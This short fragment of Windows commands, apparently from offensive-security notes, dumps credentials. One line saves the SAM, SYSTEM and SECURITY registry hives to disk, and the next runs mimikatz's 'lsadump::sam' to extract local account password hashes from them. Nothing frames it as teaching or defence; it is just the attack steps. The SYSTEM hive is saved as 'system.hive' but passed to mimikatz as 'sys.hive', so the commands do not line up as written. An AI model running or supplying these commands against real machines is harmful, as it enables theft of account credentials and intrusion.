	>reg save hklm\sam c:\sam.hive &reg save hklm\system c:\system.hive &reg save hklm\security c:\security.hive
	>mimikatz.exe "lsadump::sam /system:sys.hive /sam:sam.hive" exit